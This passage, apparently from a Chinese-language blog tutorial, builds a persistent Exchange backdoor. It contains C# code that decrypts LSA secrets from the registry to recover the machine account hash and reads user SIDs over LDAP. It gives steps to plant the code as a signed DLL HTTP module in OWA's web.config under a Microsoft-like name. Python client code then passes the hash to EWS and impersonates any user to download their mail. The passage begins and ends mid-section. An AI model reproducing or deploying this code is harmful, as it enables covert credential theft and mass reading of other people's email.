class="hljs-number">4</span>] &#123; <span class="hljs-string">&quot;JD&quot;</span>, <span class="hljs-string">&quot;Skew1&quot;</span>, <span class="hljs-string">&quot;GBG&quot;</span>, <span class="hljs-string">&quot;Data&quot;</span> &#125;;<br>            <span class="hljs-built_in">byte</span>[] transforms = <span class="hljs-keyword">new</span> <span class="hljs-built_in">byte</span>[] &#123; <span class="hljs-number">0x8</span>, <span class="hljs-number">0x5</span>, <span class="hljs-number">0x4</span>, <span class="hljs-number">0x2</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0xd</span>, <span class="hljs-number">0x3</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x6</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0xc</span>, <span class="hljs-number">0xe</span>, <span class="hljs-number">0xa</span>, <span class="hljs-number">0xf</span>, <span class="hljs-number">0x7</span> &#125;;<br>            StringBuilder scrambledKey = <span class="hljs-keyword">new</span> StringBuilder();<br><br>            <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>            &#123;<br>                <span class="hljs-built_in">string</span> keyPath = <span class="hljs-string">@&quot;SYSTEM\CurrentControlSet\Control\Lsa\&quot;</span> + keys[i];<br>                IntPtr regKeyHandle = remoteConnection.OpenRegKey(keyPath);<br>                scrambledKey.Append(remoteConnection.GetRegKeyClassData(regKeyHandle));<br>                remoteConnection.CloseRegKey(regKeyHandle);<br>            &#125;<br>            <span class="hljs-built_in">byte</span>[] scrambled = StringToByteArray(scrambledKey.ToString());<br>            <span class="hljs-built_in">byte</span>[] unscrambled = <span class="hljs-keyword">new</span> <span class="hljs-built_in">byte</span>[<span class="hljs-number">16</span>];<br>            <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++)<br>            &#123;<br>                unscrambled[i] = scrambled[transforms[i]];<br>            &#125;<br>            <span class="hljs-keyword">return</span> unscrambled;<br></code></pre></td></tr></table></figure><h5 id="解密lsa获得hash"><a href="#解密lsa获得hash" class="headerlink" title="解密lsa获得hash"></a>解密lsa获得hash</h5><p>如之前的图示，缓存信息的加密密码为 <code>NL$KM</code> 密钥</p><p>而机器hash存储在 <code>$MACHINE.ACC</code> 之中</p><p><img src="https://2603957456-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-L_nYmCFo8ktkxF6qft3%2F-L_nZ7oFKOEfqjALlDeR%2FScreenshot%20from%202019-03-12%2020-20-39.png?alt=media&token=89ffe933-7352-4323-ab6d-9f1e93213da4" alt="img"></p><p><strong><em>解密步骤</em></strong>：</p><ul><li><p>得到 bootkey</p></li><li><p>利用 bootkey 解密 LSA Key</p></li><li><p>利用 LSA Key 解密 NLKM Key</p></li><li><p>利用 NLKM Key 解密 MSCACHE</p></li></ul><p>这一段是参考的网络上的项目</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> List&lt;<span class="hljs-built_in">string</span>&gt; <span class="hljs-title">ParseLsa</span>(<span class="hljs-params">RegistryHive security, <span class="hljs-built_in">byte</span>[] bootKey, <span class="hljs-keyword">ref</span> RemoteOps remoteConnection</span>)</span><br><span class="hljs-function"></span>        &#123;<br>            <span class="hljs-keyword">try</span><br>            &#123;<br>                <span class="hljs-built_in">byte</span>[] fVal = GetValueKey(security, <span class="hljs-string">@&quot;Policy\PolEKList\Default&quot;</span>).Data;<br>                LsaSecret <span class="hljs-keyword">record</span> = <span class="hljs-keyword">new</span> LsaSecret(fVal);<br>                <span class="hljs-built_in">byte</span>[] dataVal = <span class="hljs-keyword">record</span>.data.Take(<span class="hljs-number">32</span>).ToArray();<br>                <span class="hljs-built_in">byte</span>[] tempKey = Crypto.ComputeSha256(bootKey, dataVal);<br>                <span class="hljs-built_in">byte</span>[] dataVal2 = <span class="hljs-keyword">record</span>.data.Skip(<span class="hljs-number">32</span>).Take(<span class="hljs-keyword">record</span>.data.Length - <span class="hljs-number">32</span>).ToArray();<br>                <span class="hljs-built_in">byte</span>[] decryptedLsaKey = Crypto.DecryptAES_ECB(dataVal2, tempKey).Skip(<span class="hljs-number">68</span>).Take(<span class="hljs-number">32</span>).ToArray();<br><br>                <span class="hljs-comment">//get NLKM Secret</span><br>                <span class="hljs-built_in">byte</span>[] nlkmKey = <span class="hljs-literal">null</span>;<br>                NodeKey nlkm = GetNodeKey(security, <span class="hljs-string">@&quot;Policy\Secrets\NL$KM&quot;</span>);<br>                <span class="hljs-keyword">if</span> (nlkm != <span class="hljs-literal">null</span>)<br>                &#123;<br>                    nlkmKey = DumpSecret(nlkm, decryptedLsaKey);<br>                    &#125;<br>                 <span class="hljs-keyword">foreach</span> (<span class="hljs-function">NodeKey secret <span class="hljs-keyword">in</span> <span class="hljs-title">GetNodeKey</span>(<span class="hljs-params">security, <span class="hljs-string">@&quot;Policy\Secrets&quot;</span></span>).ChildNodes)</span><br><span class="hljs-function"></span>                    &#123;<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.Compare(secret.Name, <span class="hljs-string">&quot;NL$Control&quot;</span>, StringComparison.OrdinalIgnoreCase) != <span class="hljs-number">0</span>)<br>                        &#123;<br>                            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.Compare(secret.Name, <span class="hljs-string">&quot;NL$KM&quot;</span>, StringComparison.OrdinalIgnoreCase) != <span class="hljs-number">0</span>)<br>                            &#123;<br>                                LsaSecretBlob secretBlob = <span class="hljs-keyword">new</span> LsaSecretBlob(DumpSecret(secret, decryptedLsaKey));<br>                                <span class="hljs-keyword">if</span> (secretBlob.length &gt; <span class="hljs-number">0</span>)<br>                                &#123;<br>                                    retVal.Add(PrintSecret(secret.Name, secretBlob, <span class="hljs-keyword">ref</span> remoteConnection));<br>                                &#125;<br>                            &#125;<br>                            <span class="hljs-keyword">else</span><br>                            &#123;<br>                                LsaSecretBlob secretBlob = <span class="hljs-keyword">new</span> LsaSecretBlob(nlkmKey);<br>                                <span class="hljs-keyword">if</span> (secretBlob.length &gt; <span class="hljs-number">0</span>)<br>                                &#123;<br>                                    retVal.Add(PrintSecret(secret.Name, secretBlob, <span class="hljs-keyword">ref</span> remoteConnection));<br>                                &#125;<br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                &#125;<br></code></pre></td></tr></table></figure><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">string</span> <span class="hljs-title">PrintSecret</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> keyName, LsaSecretBlob secretBlob, <span class="hljs-keyword">ref</span> G remoteConnection</span>)</span><br><span class="hljs-function"></span>        &#123;<br>            <span class="hljs-built_in">string</span> secretOutput = <span class="hljs-built_in">string</span>.Format(<span class="hljs-string">&quot;[*] &#123;0&#125;\r\n&quot;</span>, keyName);<br>            <span class="hljs-keyword">if</span> (keyName.ToUpper().StartsWith(<span class="hljs-string">&quot;$MACHINE.ACC&quot;</span>))<br>            &#123;<br>                <span class="hljs-built_in">string</span> computerAcctHash = BitConverter.ToString(A.Md4Hash2(secretBlob.secret)).Replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).ToLower();<br>                <span class="hljs-built_in">string</span> domainName = remoteConnection.GetRegistryKeyValue(<span class="hljs-string">@&quot;SYSTEM\CurrentControlSet\Services\Tcpip\Parameters&quot;</span>, <span class="hljs-string">&quot;Domain&quot;</span>);<br>                <span class="hljs-built_in">string</span> computerName = remoteConnection.GetRegistryKeyValue(<span class="hljs-string">@&quot;SYSTEM\CurrentControlSet\Services\Tcpip\Parameters&quot;</span>, <span class="hljs-string">&quot;Hostname&quot;</span>);<br>                secretOutput += <span class="hljs-built_in">string</span>.Format(<span class="hljs-string">&quot;&#123;0&#125;\\&#123;1&#125;$:aad3b435b51404eeaad3b435b51404ee:&#123;2&#125;&quot;</span>, domainName, computerName, computerAcctHash);<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> secretOutput;<br>        &#125;<br></code></pre></td></tr></table></figure><p>即可获得机器hash</p><h4 id="获得sid"><a href="#获得sid" class="headerlink" title="获得sid"></a>获得sid</h4><p>我们需要获得每个需要下载用户的sid，才能完成用户的模拟。域用户的sid可以通过查询域信息获得，条目为 <code>objectsid</code>。c# 对于 AD 的操作还是非常方便的</p><p>通过 <code>DirectoryEntry</code> 即可</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-function"><span class="hljs-keyword">public</span> SearchResult <span class="hljs-title">GetCurrentFullName</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> user</span>)</span><br><span class="hljs-function"></span>       &#123;<br>           user = Encoding.UTF8.GetString(Convert.FromBase64String(user));<br>           <span class="hljs-built_in">string</span> DomainName = System.Environment.UserDomainName;<br>           DirectoryEntry de = <span class="hljs-keyword">new</span> DirectoryEntry(<span class="hljs-string">&quot;LDAP://&quot;</span> + DomainName);<br>           DirectorySearcher ds = <span class="hljs-keyword">new</span> DirectorySearcher(de);<br>           ds.Filter = (<span class="hljs-string">&quot;(samaccountname=&quot;</span> + user + <span class="hljs-string">&quot;)&quot;</span>);<br>           SearchResult res = ds.FindOne();<br>           <span class="hljs-keyword">return</span> res;<br>       &#125;<br></code></pre></td></tr></table></figure><p>通过 <code>DirectoryEntry</code> 类就可以完成域信息的查询，指定filter为 <code>samaccountname</code> 即可获得该用户的域信息</p><p>不过这里又一个小坑，大部分的域信息值都是 string 类型，但是 <code>objectsid</code> 值是一个 <code>byte[]</code> 类型的值。好在微软提供了 <code>SecurityIdentifier</code> 类用以转换该值为string类型，即我们常见的 ‘S-1-5-21-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx’ </p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-built_in">byte</span>[] objectsid = (<span class="hljs-built_in">byte</span>[])sr.GetDirectoryEntry().Properties[<span class="hljs-string">&quot;objectSid&quot;</span>][<span class="hljs-number">0</span>];<br>SecurityIdentifier sid = <span class="hljs-keyword">new</span> SecurityIdentifier(objectsid, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">string</span> sid_text = sid.ToString();<br></code></pre></td></tr></table></figure><p>这样就成功获得了用户的 sid 。</p><h4 id="部署dll"><a href="#部署dll" class="headerlink" title="部署dll"></a>部署dll</h4><p>如上我们的server端就基本完成了，剩下的工作是完成部署。</p><p>我们使用vs，新建一个类库项目</p><p><img src="/img/article2/image-20220327063423202.png" alt="image-20220327063423202"></p><p>完成代码编写后，编辑编译信息：</p><ul><li><p>首先去除debug信息</p></li><li><p>对dll进行自签名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">项目属性 -&gt; signing -&gt; sign the assembly <span class="hljs-comment"># 即可查看dll信息可以有publictoken</span><br></code></pre></td></tr></table></figure></li><li><p>通过命令可查看签名</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">([<span class="hljs-type">system.reflection.assembly</span>]::loadfile(<span class="hljs-string">&quot;1.dll&quot;</span>)).FullName<br></code></pre></td></tr></table></figure></li><li><p>在owa目录下新建bin文件夹，将dll文件放入该文件夹，并编辑 <code>web.config</code> 文件</p><p>在 <code>&lt;Module&gt;</code> 标签下添加</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;<span class="hljs-builtin-name">add</span> <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;HttpFilter&quot;</span> <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;Microsoft.Exchange.HTTPFilter.webFilter,Microsoft.Exchange.HTTPFilter,Version=15.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><p><code>name</code> 可以随意填写</p><p><code>type</code> 第一个参数为 <code>命名空间+类名</code> 第二个为 dll 名</p><p><code>PublicKeyToken</code> 即为签名</p></li></ul><h3 id="Client端"><a href="#Client端" class="headerlink" title="Client端"></a>Client端</h3><p>client基于python编写，通过从server获得的hash与sid，构造请求获得用户的邮件</p><h4 id="pth-to-ews"><a href="#pth-to-ews" class="headerlink" title="pth_to_ews"></a>pth_to_ews</h4><p>客户端第一步需要实现的就是通过机器hash认证ews接口。</p><p>参考：<a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Pass-the-Hash-with-Exchange-Web-Service">https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Pass-the-Hash-with-Exchange-Web-Service</a></p><p>机器hash基本是无法解密的，所以我们只能使用hash去进行认证。</p><p>当然我们可以使用mimikatz进行pth，但是这样太过麻烦，所以我们选择通过代码来进行认证。</p><p>这里我参考了三好学生的文章以及 <code>impacket</code> 的 <code>http.py</code> 的代码。</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-5-12/4-1.png" alt="Alt text"></p><p>如图所示，exchange的ews接口支持ntlm认证。这里使用的就是 <code>Net-Ntlm</code></p><p>认证流程如下：</p><ol><li>客户端向服务器发送一个GET请求，请求获得网页内容 </li><li>服务器由于开启了NTLM认证，所以返回401，提示需要NTLM认证 </li><li>客户端发起NTLM认证，向服务器发送协商消息 </li><li>服务器收到消息后，生成一个16位的随机数(这个随机数被称为Challenge),明文发送回客户端 </li><li>客户端接收到Challenge后，使用输入的密码hash对Challenge加密，生成response，将response发送给服务器 </li><li>服务器接收客户端加密后的response，经过同样的运算，比较结果，若匹配，提供后续服务，否则，认证失败</li></ol><p>因此我们的登录过程为：</p><ul><li>模拟NTLM Over HTTP Protocol，直接传入hash，对Challenge加密，生成response，将response发送给服务器</li></ul><p>Net-Ntlm的格式为：<code>username::domain:challenge:HMAC-MD5:blob</code></p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-8/2-7.png" alt="Alt text"></p><p>而impacket的ntlm类可以帮我们很好的构造Net-Ntlm结构，代码基本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_session</span>(<span class="hljs-params">host, domain, user, nthash</span>):</span><br>    session = requests.session()<br>    url = <span class="hljs-string">&#x27;https://&#x27;</span>+ host + ews_url<br>    ntlm_nego = ntlm.getNTLMSSPType1(host, domain)<br>    negotiate = base64.b64encode(ntlm_nego.getData())<br>    headers = &#123;<br>        <span class="hljs-string">&quot;Authorization&quot;</span>: <span class="hljs-string">&#x27;NTLM %s&#x27;</span> % negotiate.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>),<br>        <span class="hljs-string">&quot;Content-type&quot;</span>: <span class="hljs-string">&quot;text/xml; charset=utf-8&quot;</span>,<br>        <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/xml&quot;</span>,<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36&quot;</span><br>    &#125;<br>    res = session.get(url,headers=headers,verify=<span class="hljs-literal">False</span>)<br>    ntlm_challenge_b64 = re.search(<span class="hljs-string">&#x27;NTLM ([a-zA-Z0-9+/]+=&#123;0,2&#125;)&#x27;</span>, res.headers[<span class="hljs-string">&#x27;WWW-Authenticate&#x27;</span>]).group(<span class="hljs-number">1</span>)<br>    ntlm_challenge = base64.b64decode(ntlm_challenge_b64)<br>    password1 = <span class="hljs-string">&#x27;&#x27;</span><br>    nt_hash = binascii.unhexlify(nthash)<br>    lm_hash = <span class="hljs-string">&#x27;&#x27;</span>    <br>    ntlm_auth, _ = ntlm.getNTLMSSPType3(ntlm_nego, ntlm_challenge, user, password1, domain, lm_hash, nt_hash)<br>    auth = base64.b64encode(ntlm_auth.getData())<br>    headers = &#123;<br>        <span class="hljs-string">&quot;Authorization&quot;</span>: <span class="hljs-string">&#x27;NTLM %s&#x27;</span> % auth.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>),<br>        <span class="hljs-string">&quot;Content-type&quot;</span>: <span class="hljs-string">&quot;text/xml; charset=utf-8&quot;</span>,<br>        <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/xml&quot;</span>,<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36&quot;</span><br>    &#125;<br>    session.get(url,headers=headers,verify=<span class="hljs-literal">False</span>)    <br>    <span class="hljs-keyword">return</span> session<br><br></code></pre></td></tr></table></figure><h4 id="soap请求"><a href="#soap请求" class="headerlink" title="soap请求"></a>soap请求</h4><p>ews接口是exchange提供的web service，我们可以通过soap请求对用户的邮箱进行多种操作。</p><p>而当认证用户是机器用户时，支持通过用户sid来模拟任一用户的身份（该功能只限机器用户，管理员组无此权限）</p><p>对与机器用户，只需在请求中加上认证头标签，即可模拟任意用户</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">soap:Header</span>&gt;</span><br>     &lt;t:RequestServerVersion Version=&quot;Exchange2013&quot; /&gt;<br>     &lt;t:SerializedSecurityContext&gt;<br>         &lt;t:UserSid&gt;sid&lt;/t:UserSid&gt;<br>         &lt;t:GroupSids&gt;<br>             &lt;t:GroupIdentifier&gt;<br>                 &lt;t:SecurityIdentifier&gt;sid&lt;/t:SecurityIdentifier&gt;<br>             &lt;/t:GroupIdentifier&gt;<br>         &lt;/t:GroupSids&gt;<br>     &lt;/t:SerializedSecurityContext&gt;<br> <span class="hljs-tag">&lt;/<span class="hljs-name">soap:Header</span>&gt;</span><br></code></pre></td></tr></table></figure><p>通过soap请求获取邮件可以参考MS的官方文档，通过以下几个步骤</p><h5 id="获取邮件数量"><a href="#获取邮件数量" class="headerlink" title="获取邮件数量"></a>获取邮件数量</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">soap:Envelope</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> </span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:m</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/exchange/services/2006/messages&quot;</span> </span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:t</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/exchange/services/2006/types&quot;</span> </span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:soap</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">soap:Body</span>&gt;</span><br>            &lt;m:GetFolder&gt;<br>                &lt;m:FolderShape&gt;<br>                    &lt;t:BaseShape&gt;Default&lt;/t:BaseShape&gt;<br>                &lt;/m:FolderShape&gt;<br>                &lt;m:FolderIds&gt;<br>                    &lt;t:DistinguishedFolderId Id=&quot;inbox&quot;&gt;<br>                        &lt;t:Mailbox&gt;<br>                            &lt;t:EmailAddress&gt;admin@cia.local&lt;/t:EmailAddress&gt;<br>                        &lt;/t:Mailbox&gt;<br>                    &lt;/t:DistinguishedFolderId&gt;<br>                &lt;/m:FolderIds&gt;<br>            &lt;/m:GetFolder&gt;<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">soap:Body</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">soap:Envelope</span>&gt;</span><br></code></pre></td></tr></table></figure><p><code>&lt;t:TotalCount&gt;</code> 标签内返回的就是邮件数量</p><h5 id="列举邮箱"><a href="#列举邮箱" class="headerlink" title="列举邮箱"></a>列举邮箱</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs xml">&#x27;<span class="hljs-meta">&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27;?&gt;</span><br>    &lt;soap:Envelope<br>    xmlns:soap=&#x27;http://schemas.xmlsoap.org/soap/envelope/&#x27;<br>    xmlns:t=&#x27;http://schemas.microsoft.com/exchange/services/2006/types&#x27;<br>    xmlns:m=&#x27;http://schemas.microsoft.com/exchange/services/2006/messages&#x27;<br>    xmlns:xsi=&#x27;http://www.w3.org/2001/XMLSchema-instance&#x27;&gt;<br>    <span class="hljs-tag">&lt;<span class="hljs-name">soap:Body</span>&gt;</span><br>        &lt;m:FindItem Traversal=&#x27;Shallow&#x27;&gt;<br>        &lt;m:ItemShape&gt;<br>            &lt;t:BaseShape&gt;AllProperties&lt;/t:BaseShape&gt;<br>        &lt;/m:ItemShape&gt;<br>        &lt;m:IndexedPageItemView MaxEntriesReturned=&quot;100&quot; Offset=&quot;0&quot; BasePoint=&quot;Beginning&quot; /&gt;<br>        &lt;m:ParentFolderIds&gt;<br>            &lt;t:DistinguishedFolderId Id=&#x27;inbox&#x27;&gt;<br>            &lt;t:Mailbox&gt;<br>                &lt;t:EmailAddress&gt;admin@cia.local&lt;/t:EmailAddress&gt;<br>            &lt;/t:Mailbox&gt;<br>            &lt;/t:DistinguishedFolderId&gt;<br>        &lt;/m:ParentFolderIds&gt;<br>        &lt;/m:FindItem&gt;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">soap:Body</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">soap:Envelope</span>&gt;</span><br></code></pre></td></tr></table></figure><p>该返回包会返回每一封邮件的信息，寄件人、title、日期等，但不会返回具体的内容和附件。</p><p>该返回包会返回 <code>ChangeKey</code> 和 <code>ItemId</code> 两个参数，通过他们可以获得具体的邮件内容</p><h4 id="mime-to-eml"><a href="#mime-to-eml" class="headerlink" title="mime_to_eml"></a>mime_to_eml</h4><p>ews支持直接通过MIME格式返回数据。mime为对整个eml文件进行base64编码后的数据流。这样获取数据比较方便，不用再单独下载附件。</p><p>我们只需要在body中加入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&lt;t:IncludeMimeContent&gt;true&lt;/t:IncludeMimeContent&gt;<br></code></pre></td></tr></table></figure><p>即可请求MIME格式数据</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">soap:Envelope</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> </span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:m</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/exchange/services/2006/messages&quot;</span> </span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:t</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/exchange/services/2006/types&quot;</span> </span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:soap</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">soap:Body</span>&gt;</span><br>        &lt;m:GetItem&gt;<br>          &lt;m:ItemShape&gt;<br>            &lt;t:BaseShape&gt;IdOnly&lt;/t:BaseShape&gt;<br>            &lt;t:BodyType&gt;Text&lt;/t:BodyType&gt;<br>            &lt;t:IncludeMimeContent&gt;true&lt;/t:IncludeMimeContent&gt;<br>          &lt;/m:ItemShape&gt;<br>          &lt;m:ItemIds&gt;<br>            &lt;t:ItemId Id=&quot;ItemId&quot; ChangeKey=&quot;ChangeKey&quot; /&gt;<br>          &lt;/m:ItemIds&gt;<br>        &lt;/m:GetItem&gt;<br>      <span class="hljs-tag">&lt;/<span class="hljs-name">soap:Body</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">soap:Envelope</span>&gt;</span><br></code></pre></td></tr></table></figure><p>返回的MIME数据在 <code>&lt;t:MimeContent CharacterSet=&quot;UTF-8&quot;&gt;</code> 标签中</p><p>将该数据进行base64解码，即可获得eml数据，将其保存为eml文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">a = <span class="hljs-built_in">open</span>(dir1+<span class="hljs-string">&#x27;\\&#x27;</span>+topic+<span class="hljs-string">&#x27;.eml&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br>a.write(<span class="hljs-built_in">str</span>(base64.b64decode(mimetext.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)), <span class="hljs-string">&quot;utf-8&quot;</span>))<br></code></pre></td></tr></table></figure><p>使用邮箱软件或浏览器即可打开，会自动帮助我们解码。</p><hr><p>至此，我们的后门程序就基本完成了</p><h3 id="一些其他细节"><a href="#一些其他细节" class="headerlink" title="一些其他细节"></a>一些其他细节</h3><h5 id="负载"><a href="#负载" class="headerlink" 